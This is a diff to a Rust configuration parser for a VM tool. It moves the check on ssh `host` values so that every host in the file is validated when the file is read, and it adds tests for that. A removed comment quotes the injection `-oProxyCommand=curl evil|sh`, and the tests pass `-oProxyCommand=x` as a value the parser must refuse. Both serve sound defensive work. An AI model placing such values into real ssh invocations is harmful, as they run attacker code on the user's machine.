@@ -45,6 +45,10 @@
 //! struct doing that would carry its own `deny_unknown_fields`
 //! and so refuse the keys the first one names, and the two would
 //! drift as the file grows.
+//!
+//! [`parse`] applies the host rule to every `host` key as the
+//! file is read, so holding a [`Registry`] proves every host in
+//! it passed.
 
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
@@ -67,14 +71,22 @@ pub const USER_CONFIG_FILE: &str = "config.toml";
 /// `project`: the table key supplies that name, so a project
 /// cannot disagree with itself about what it is called.
 ///
-/// Two fields are checked by their own types as the table
-/// parses: `repo` is a [`super::RepoUrl`] and `script` a
+/// The fields are checked in three different places, and which
+/// one depends on what carries the rule.
+///
+/// `repo` and `script` are checked by their own types as the
+/// table parses: `repo` is a [`super::RepoUrl`] and `script` a
 /// [`super::ScriptPath`], so a bad value fails the parse and
-/// names the line. The rest -- `remote_root`, the optional
-/// `host`, and `box`, `cpus`, `memory` and `ref` inside the two
-/// tables -- have rules that no type carries.
-/// `Project::validate` runs those, and [`Registry::project`]
-/// calls it before handing an entry out.
+/// names the line.
+///
+/// The optional `host` is checked by `parse`, once the table
+/// has parsed and before any `Registry` exists, along with every
+/// other `host` in the file.
+///
+/// The rest -- `remote_root`, and `box`, `cpus`, `memory` and
+/// `ref` inside the two tables -- are checked by
+/// `Project::validate`, which [`Registry::project`] calls before
+/// handing an entry out.
 #[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub struct Project {
@@ -96,29 +108,9 @@ pub struct Project {
     #[serde(default = "default_remote_root")]
     pub remote_root: String,
 
-    /// The VM host this one project runs on, when it does not
-    /// run on the machine the file-wide `host` names.
-    ///
-    /// Optional, and absent from most entries. It exists for
-    /// the operator who keeps one project on a different
-    /// machine: without it they type `--host` on every command
-    /// for that project and rely on remembering to.
-    ///
-    /// A `String` rather than a checked type, and the reason is
-    /// the third of the three cases `CLAUDE.md` allows: a
-    /// standard type already carries the meaning, because
-    /// `super::Config::host` is a `String` too and this value
-    /// becomes that one. A newtype on this field alone would be
-    /// unwrapped at that boundary, which is where the rule has
-    /// already run.
-    ///
-    /// So the rule runs instead of the type, and it runs on both
-    /// paths that reach the value: `super::Config::load` runs
-    /// `host_problem` once the ranking has picked a winner, so
-    /// the error names whichever source supplied the bad value,
-    /// and `Project::validate` runs the same function for
-    /// anything asking [`Registry::project`] for the entry
-    /// directly.
+    /// The VM host this one project runs on, when it is not the
+    /// machine the file-wide `host` names. Absent from most
+    /// entries.
     pub host: Option<String>,
 
     /// The machine to build.
@@ -182,15 +174,39 @@ pub struct Registry {
 }
 
 impl Project {
-    /// Runs the rules no type on these fields carries.
+    /// Assembles a [`super::Config`] from this entry.
     ///
-    /// Each rule lives in the module that owns the field, and
-    /// this function states none of them: it calls
+    /// `name` is the table key this entry was found under, and
+    /// becomes `Config::project`. The entry does not carry the
+    /// name itself, so a project cannot disagree with itself
+    /// about what it is called.
+    ///
+    /// `host` comes from the caller because four sources can
+    /// supply one and this entry is only the third of them.
+    /// `super::Config::load_project` ranks them and passes the
+    /// winner.
+    ///
+    /// The fields are cloned. The registry is read once per run
+    /// and one entry out of it is small, so borrowing them into
+    /// the `Config` -- and giving that type a lifetime every
+    /// module holding one would carry -- buys nothing.
+    pub(super) fn to_config(&self, name: &str, host: String) -> super::Config {
+        super::Config {
+            host,
+            project: name.to_owned(),
+            remote_root: self.remote_root.clone(),
+            vm: self.vm.clone(),
+            source: self.source.clone(),
+        }
+    }
+
+    /// Runs the rules no type on these fields carries:
     /// `super::root::check` for `remote_root`, then the `[vm]`
-    /// and `[source]` checks, then `super::host::host_problem`
-    /// for an entry that names its own host.
-    /// `super::Config::validate` calls the same ones, and the
-    /// two agree because neither holds a copy of a rule.
+    /// and `[source]` checks.
+    ///
+    /// **`host` is not among them.** [`parse`] applies that rule
+    /// to every key in the file as it is read, so by the time
+    /// anything calls this, the entry's host has passed.
     ///
     /// # Errors
     ///
@@ -201,26 +217,6 @@ impl Project {
         super::root::check(&self.remote_root)?;
         super::vm::validate(&self.vm)?;
         super::source::validate(&self.source)?;
-        // `host` reaches `ssh` as its first positional argument
-        // and `ssh` honours no `--` separator, so
-        // `-oProxyCommand=curl evil|sh` runs code on the
-        // workstation. `super::host::host_problem` holds the
-        // rule and this calls it, so the entry lookup and the
-        // ranking cannot come to disagree about what a legal
-        // host looks like.
-        if let Some(host) = &self.host
-            && let Some(problem) = super::host_problem(host)
-        {
-            return Err(match problem {
-                super::HostProblem::Empty => {
-                    ConfigError::Empty { field: "host" }
-                }
-                super::HostProblem::Invalid(reason) => ConfigError::Invalid {
-                    field: "host",
-                    reason,
-                },
-            });
-        }
         Ok(())
     }
 }
@@ -255,14 +251,15 @@ impl Registry {
 
     /// Returns the VM host this file names, if it names one.
     ///
-    /// **Unchecked, unlike [`Registry::project`].** The rules
-    /// for a host value live in `super::host`, and
-    /// `super::Config::load` runs them once the ranking across
-    /// all four sources -- `--host`, the environment, and the
-    /// two keys in this file -- has picked a winner, so the
-    /// error can name the source that supplied
-    /// the bad value. Checking here as well would report a value
-    /// this file supplies even on a run that never uses it.
+    /// **Already checked.** `parse` applies the host rule to
+    /// every `host` key in the file as it is read, so holding a
+    /// [`Registry`] is the proof this value passed and there is
+    /// nothing left for this method to run.
+    ///
+    /// The rules themselves live in `super::host`, which is
+    /// where they are written down. The ranking across all four
+    /// sources still applies its own check, because `--host` and
+    /// the environment variable never came through this file.
     #[must_use]
     pub fn host(&self) -> Option<&str> {
         self.host.as_deref()
@@ -284,23 +281,22 @@ impl Registry {
     /// reports a missing entry, once, with a message saying
     /// which table to write.
     ///
-    /// **No rule runs on the value returned**, neither the host
-    /// rule nor the rest of `Project::validate`. Two separate
-    /// reasons, and both are about reporting the problem in the
-    /// right place. `super::Config::load` runs
-    /// `super::host_problem` once the ranking has picked a
-    /// winner, so the error names the source that supplied the
-    /// bad value rather than one this run never consulted. And
-    /// an entry whose `cpus` is zero still supplies its host
-    /// here, because refusing would demote that project to the
+    /// **The host it returns has passed the host rule**, applied
+    /// by [`parse`] to every key in the file. So the guarantee
+    /// that a leading `-` never reaches `ssh` does not rest on
+    /// what this method's callers remember to do.
+    ///
+    /// **The rest of `Project::validate` has not run.** An entry
+    /// whose `cpus` is zero still supplies its host here,
+    /// deliberately: refusing would demote that project to the
     /// file-wide host and boot its VM on the wrong machine,
-    /// while the broken value is reported anyway the moment
+    /// while the broken `cpus` is reported anyway the moment
     /// anything asks [`Registry::project`] for the entry.
     ///
-    /// That is also why this is `pub(crate)`: the guarantee that
-    /// a leading `-` never reaches `ssh` rests on `Config::load`
-    /// running the rule, and handing the unchecked value outside
-    /// the crate would put that guarantee in a caller's hands.
+    /// `pub(crate)` all the same. Nothing outside the crate has
+    /// a use for one project's preferred host without the rest
+    /// of its entry, and [`Registry::project`] is the way to ask
+    /// for that.
     pub(crate) fn project_host(
         &self,
         name: &str,
@@ -322,10 +318,17 @@ impl Registry {
     ///
     /// **Only the value rules wait until here.** A table that
     /// does not parse fails the whole file, whichever project
-    /// was asked for. `super::host` opens the registry only when
-    /// neither `--host` nor the environment names a host, so a
-    /// broken table cannot stop a run that gets its host another
-    /// way.
+    /// was asked for, and so does a bad `host` anywhere in it.
+    ///
+    /// Whether a broken table can stop a run that got its host
+    /// from `--host` depends on the loader.
+    /// `super::Config::load` reaches this file only through
+    /// `super::resolve_host`, which does not open it when the
+    /// flag or the environment names a host -- so for that
+    /// loader a broken table is skipped along with the file.
+    /// `super::Config::load_project` has no such exemption: it
+    /// reads the file for the project's settings whatever the
+    /// flag says, and calls this before ranking anything.
     ///
     /// What waits is whatever `Project::validate` runs. The
     /// project name waits for nothing: it is a map key, and
@@ -368,10 +371,29 @@ pub(super) fn path(dir: &Path) -> PathBuf {
     dir.join(USER_CONFIG_FILE)
 }
 
+/// One project's table heading, as an operator must write it.
+///
+/// `tail` goes inside the brackets, so `""` gives
+/// `[projects."x"]` and `".vm"` gives `[projects."x".vm]`.
+///
+/// The name is quoted because it may contain a `.`, which TOML
+/// reads as nesting. `docs/architecture.md` under **The heading
+/// spelling has one owner** says why every message asks this
+/// rather than spelling it.
+pub(super) fn heading(name: &str, tail: &str) -> String {
+    format!("[projects.{name:?}{tail}]")
+}
+
 /// Parses `source` as the registry read from `path`.
 ///
 /// The only way to build a [`Registry`], so the path in an
 /// error message is always the path the text came from.
+///
+/// Private, so [`Registry::read`] is the only way production
+/// code reaches a `Registry`. That is what makes the type's
+/// promise -- every one in existence knows which file it came
+/// from -- hold: a second route from arbitrary text would let a
+/// caller name a path bombyx never opened.
 ///
 /// # Errors
 ///
@@ -379,11 +401,51 @@ pub(super) fn path(dir: &Path) -> PathBuf {
 /// TOML or carries a key the registry does not define.
 fn parse(source: &str, path: &Path) -> Result<Registry, ConfigError> {
     let file: RegistryFile = from_toml(source, path)?;
+
+    // Every `host` in the file, not only the one a later
+    // command turns out to want. This module's header says why,
+    // under "Every host in the file is checked as the file is
+    // read", and is the one place that reasoning lives.
+    if let Some(host) = &file.host {
+        super::host::refuse_if_bad(
+            host,
+            &super::HostOrigin::UserFile,
+            Some(path),
+        )?;
+    }
+    for (key, project) in &file.projects {
+        if let Some(host) = &project.host {
+            super::host::refuse_if_bad(
+                host,
+                &super::HostOrigin::ProjectEntry(key.clone()),
+                Some(path),
+            )?;
+        }
+    }
+
     Ok(Registry {
         path: path.to_path_buf(),
         host: file.host,
         projects: file.projects,
     })
+}
+
+/// [`parse`], for a test that would otherwise need a directory.
+///
+/// Gated on `cfg(test)`, so the widened visibility exists only
+/// in a test build and production keeps the single route above.
+/// The callers are `super::Config::parse_registry` and the
+/// helper in `super`'s own test module.
+///
+/// # Errors
+///
+/// Whatever [`parse`] returns.
+#[cfg(test)]
+pub(super) fn parse_for_tests(
+    source: &str,
+    path: &Path,
+) -> Result<Registry, ConfigError> {
+    parse(source, path)
 }
 
 #[cfg(test)]
@@ -471,9 +533,9 @@ mod tests {
         let registry = parsed("host = \"vmhost\"\n");
         let err = registry.project("myproject").unwrap_err().to_string();
         assert!(err.contains("/home/dev/config.toml"), "{err}");
-        assert!(err.contains("[projects.myproject]"), "{err}");
-        assert!(err.contains("[projects.myproject.vm]"), "{err}");
-        assert!(err.contains("[projects.myproject.source]"), "{err}");
+        assert!(err.contains("[projects.\"myproject\"]"), "{err}");
+        assert!(err.contains("[projects.\"myproject\".vm]"), "{err}");
+        assert!(err.contains("[projects.\"myproject\".source]"), "{err}");
         assert!(err.contains("remote_root"), "{err}");
     }
 
@@ -482,6 +544,14 @@ mod tests {
         // Holding a `&Project` has to be proof the values
         // passed, the way holding a `Config` is. Each of these
         // breaks a rule owned by a different module.
+        //
+        // `host` is not in the table, and its absence is the
+        // point: it is refused earlier, when the file is read,
+        // so a registry carrying a bad one never becomes a
+        // `Registry` for anything to look an entry up in.
+        // `reading_the_file_refuses_a_bad_host_in_an_entry`
+        // covers it. Between the two tests every value in an
+        // entry is checked before a caller can act on it.
         for (from, to) in [
             ("remote_root = \"~/vms\"", "remote_root = \"/\""),
             ("cpus = 4", "cpus = 0"),
@@ -491,14 +561,6 @@ mod tests {
                 "box = \"generic/ubuntu\\\"2204\"",
             ),
             ("ref = \"main\"", "ref = \"\""),
-            (
-                "remote_root = \"~/vms\"",
-                "remote_root = \"~/vms\"\nhost = \"-oProxyCommand=x\"",
-            ),
-            (
-                "remote_root = \"~/vms\"",
-                "remote_root = \"~/vms\"\nhost = \"\"",
-            ),
         ] {
             let source = registry_toml().replace(from, to);
             let registry = parsed(&source);
@@ -699,5 +761,153 @@ mod tests {
         let err = Registry::read(dir.path()).unwrap_err();
         assert!(matches!(err, ConfigError::Parse { .. }));
         assert!(err.to_string().contains(USER_CONFIG_FILE), "{err}");
+    }
+
+    /// Every host value the whole family of guards refuses.
+    ///
+    /// One table, used for the file-wide key and for a project's
+    /// key, so the two cannot come to disagree about what a
+    /// legal host looks like. The reasons come from
+    /// `super::host::host_problem`, which is where the rules
+    /// are; this only asserts that reading the file applies
+    /// them.
+    const BAD_HOSTS: [(&str, &str); 4] = [
+        ("", "must not be empty"),
+        ("   ", "must not be empty"),
+        ("-oProxyCommand=x", "must not start with"),
+        ("vm host", "letters, digits"),
+    ];
+
+    #[test]
+    fn reading_the_file_refuses_a_bad_file_wide_host() {
+        for (bad, reason) in BAD_HOSTS {
+            let source = registry_toml()
+                .replace("host = \"vmhost\"", &format!("host = {bad:?}"));
+            let err = parse_at(&source, "/home/dev/config.toml").unwrap_err();
+            let text = err.to_string();
+            assert!(
+                matches!(err, ConfigError::InvalidHost { .. }),
+                "{bad:?} must be refused, got {text}"
+            );
+            assert!(text.contains(reason), "{bad:?}: {text}");
+            // The operator has to find the value, so the message
+            // names the file it is in.
+            assert!(text.contains("/home/dev/config.toml"), "{text}");
+        }
+    }
+
+    #[test]
+    fn reading_the_file_refuses_a_bad_host_in_an_entry() {
+        for (bad, reason) in BAD_HOSTS {
+            let source = registry_toml().replace(
+                "[projects.myproject]\n",
+                &format!("[projects.myproject]\nhost = {bad:?}\n"),
+            );
+            let err = parse_at(&source, "/home/dev/config.toml").unwrap_err();
+            let text = err.to_string();
+            assert!(
+                matches!(err, ConfigError::InvalidHost { .. }),
+                "{bad:?} must be refused, got {text}"
+            );
+            assert!(text.contains(reason), "{bad:?}: {text}");
+            // The table, not just the file: an operator with
+            // twenty projects in one file needs the heading.
+            assert!(text.contains("[projects.\"myproject\"].host"), "{text}");
+            assert!(text.contains("/home/dev/config.toml"), "{text}");
+        }
+    }
+
+    #[test]
+    fn a_bad_host_in_another_project_still_fails_the_file() {
+        // The rule is about what the file says, not about which
+        // project a command asked for. A file bombyx will not
+        // stand behind is refused whole, the way a table that
+        // does not parse fails whichever project was wanted.
+        let source = format!(
+            "{}\n[projects.other]\nhost = \"-oProxyCommand=x\"\n{}",
+            registry_toml(),
+            "[projects.other.vm]\n\
+             provider = \"libvirt\"\n\
+             box = \"generic/ubuntu2204\"\n\
+             cpus = 2\n\
+             memory = 2048\n\n\
+             [projects.other.source]\n\
+             repo = \"https://example.invalid/other.git\"\n\
+             ref = \"main\"\n\
+             script = \"vagrant/provision.sh\"\n"
+        );
+        let err = parse_at(&source, "/home/dev/config.toml").unwrap_err();
+        let text = err.to_string();
+        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
+        assert!(text.contains("[projects.\"other\"].host"), "{text}");
+    }
+
+    #[test]
+    fn every_message_spells_a_project_heading_the_same_way() {
+        // The heading is quoted in one place, `heading`, and
+        // these are the three messages that show one to an
+        // operator. A fourth that spelled it itself would pass
+        // its own test and fail this one.
+        let name = "web.api";
+        let want = "[projects.\"web.api\"]";
+        let key = ProjectName::parse(name).unwrap();
+        let messages = [
+            ConfigError::ProjectNotFound {
+                name: name.to_owned(),
+                path: PathBuf::from("/home/dev/config.toml"),
+            }
+            .to_string(),
+            ConfigError::RegistryNotFound {
+                name: name.to_owned(),
+                place: "/home/dev/config.toml".to_owned(),
+            }
+            .to_string(),
+            super::super::HostOrigin::ProjectEntry(key).to_string(),
+        ];
+        for text in messages {
+            assert!(text.contains(want), "want {want} in: {text}");
+        }
+    }
+
+    #[test]
+    fn a_dotted_project_name_is_named_as_a_quoted_table() {
+        // A project may be named `web.api`, and its heading in
+        // the file then has to be `[projects."web.api"]`: TOML
+        // reads a bare dot as nesting, so the unquoted spelling
+        // declares `api` inside `web` and the whole file is
+        // refused. The message telling the operator where the
+        // bad host is has to name the heading their file
+        // actually contains.
+        //
+        // A project name reaches an operator-readable heading
+        // in three places: this message and the two in
+        // `super::super::error`. This asserts the third.
+        let source = registry_toml()
+            .replace("[projects.myproject", "[projects.\"web.api\"")
+            .replace(
+                "[projects.\"web.api\"]\n",
+                "[projects.\"web.api\"]\nhost = \"-oProxyCommand=x\"\n",
+            );
+        let err = parse_at(&source, "/home/dev/config.toml").unwrap_err();
+        let text = err.to_string();
+        assert!(
+            text.contains("[projects.\"web.api\"].host"),
+            "the heading must be quoted, got {text}"
+        );
+    }
+
+    #[test]
+    fn a_good_host_in_every_place_is_accepted() {
+        // The other side of the guard: the shapes an operator
+        // actually writes must survive it.
+        for good in ["vmhost", "frosti", "user@10.0.0.4", "vm-host_1.lan"] {
+            let source = registry_toml().replace(
+                "[projects.myproject]\n",
+                &format!("[projects.myproject]\nhost = {good:?}\n"),
+            );
+            let registry = parse_at(&source, "/home/dev/config.toml")
+                .unwrap_or_else(|e| panic!("{good:?} must be accepted: {e}"));
+            assert_eq!(host_of(&registry, "myproject"), Some(good));
+        }
     }
 }
